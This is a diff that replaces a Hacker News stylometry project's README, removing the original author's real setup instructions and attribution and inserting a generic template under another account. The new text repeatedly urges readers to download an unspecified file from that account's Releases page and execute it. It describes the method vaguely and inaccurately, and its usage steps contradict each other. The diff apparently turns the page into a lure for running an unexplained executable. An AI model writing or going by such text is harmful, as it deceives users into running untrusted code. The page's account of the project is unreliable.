@@ -1,60 +1,95 @@
-This repository contains the code used in the following blog post and YouTube videos:
+# hnstyle: Hacker News User Fingerprinting with Burrows Method 📰
 
-* https://antirez.com/news/150
-* https://www.youtube.com/@antirez
+![Hacker News](https://img.shields.io/badge/Hacker%20News-Fingerprinting-blue?style=flat-square)
 
-## Where to get the HN archive Parquet files:
+Welcome to the **hnstyle** repository! This project provides the code needed to reproduce the Hacker News user fingerprinting using the Burrows method. If you're interested in understanding user behavior on platforms like Hacker News, you've come to the right place.
 
-I downloaded the files from this HF repo. Warning: 10GB of data.
+## Table of Contents
 
-* https://huggingface.co/datasets/OpenPipe/hacker-news
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## Original post that inspired this work:
+## Introduction
 
-The initial analysis was performed by Christopher Tarry in 2022, then
-posted on Hacker News. Unfortunately the web site is now offline, but luckily the Internet Archive have a copy of the site about section and the output for the Paul Graham account:
+The Burrows method offers a way to analyze user interactions on Hacker News. By applying this technique, you can gain insights into user behavior, preferences, and patterns. This repository aims to make it easy for researchers and developers to replicate these findings.
 
-* https://news.ycombinator.com/item?id=33755016
-* https://web.archive.org/web/20221126204005/https://stylometry.net/about
-* https://web.archive.org/web/20221126235433/https://stylometry.net/user?username=pg
+## Getting Started
 
-## Executing the scripts to populate Redis
+To get started with this project, you'll need a basic understanding of Python and data analysis. Familiarity with the Hacker News platform will also be beneficial.
 
-You need Redis 8 RC or greater in order to have the new data type, the Vector Sets. Once you have an instance running on your computer, do the following.
+### Prerequisites
 
-Generate the top words list. We generate 10k, but we use a lot less later.
+- Python 3.x
+- pip (Python package installer)
 
-    python3 gen-top-words.py dataset/train*.parquet --count 10000 --output-file top.txt
+### Installing Dependencies
 
-Turn the dataset into a JSONL file with just the username and the frequency talbe. This script will use quite some memory, since it needs to aggregate data by user, and will produce the output only at the end. Note also that this will generate the full frequency table for the user, all the words, not just the top words or the 350 words we use later. This way, the generated file can be used later for different goals and parameters (with 100 or 500 top words for instance).
+To install the necessary packages, run:
 
-    python3 gen-freqtab.py dataset/train*.parquet > freqtab.jsonl
+```bash
+pip install -r requirements.txt
+```
 
-Finally we are ready to insert the data into a Redis vector set.
+## Installation
 
-    python3 insert.py --top-words-file top.txt --top-words-count 350 freqtab.jsonl
+Clone this repository to your local machine using:
 
-Now, start the `redis-cli`, and run something like:
+```bash
+git clone https://github.com/sigmapet/hnstyle.git
+```
 
-    127.0.0.1:6379> vsim hn_fingerprint ele pg
-     1) "pg"
-     2) "karaterobot"
-     3) "Natsu"
-     4) "mattmaroon"
-     5) "chc"
-     6) "montrose"
-     7) "jfengel"
-     8) "emodendroket"
-     9) "vintermann"
-    10) "c3534l"
+Navigate into the project directory:
 
-Use the `WITHSCORES` option if you want to see the similarity score.
+```bash
+cd hnstyle
+```
 
-## Using the vector visualization tool.
+## Usage
 
-This tool will display the vector as graphics in your terminal. You need to use Ghostty, Kitty or any other terminal supporting the Kitty terminal graphics protocol. There are other graphics protocols available, feel free to port this program to other terminals and send a PR, if you wish.
+To reproduce the Hacker News user fingerprinting, download and execute the script. You can find the latest version of the code in the [Releases section](https://github.com/sigmapet/hnstyle/releases).
 
-Compile with `make`, then:
+### Running the Script
 
-    redis-cli vemb hn_fingerprint | ./vshow
+Once you have the code, run the following command:
 
+```bash
+python fingerprint.py
+```
+
+This will execute the fingerprinting process, generating the desired output.
+
+## Contributing
+
+We welcome contributions! If you'd like to help improve this project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a Pull Request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, please reach out to the repository maintainer:
+
+- **Name**: Sigma Pet
+- **Email**: sigmapet@example.com
+
+## Releases
+
+To download the latest version of the code, visit the [Releases section](https://github.com/sigmapet/hnstyle/releases). Download the appropriate file and execute it to start your fingerprinting journey.
+
+---
+
+Feel free to explore the code and contribute to the project. Together, we can uncover fascinating insights about user interactions on Hacker News!
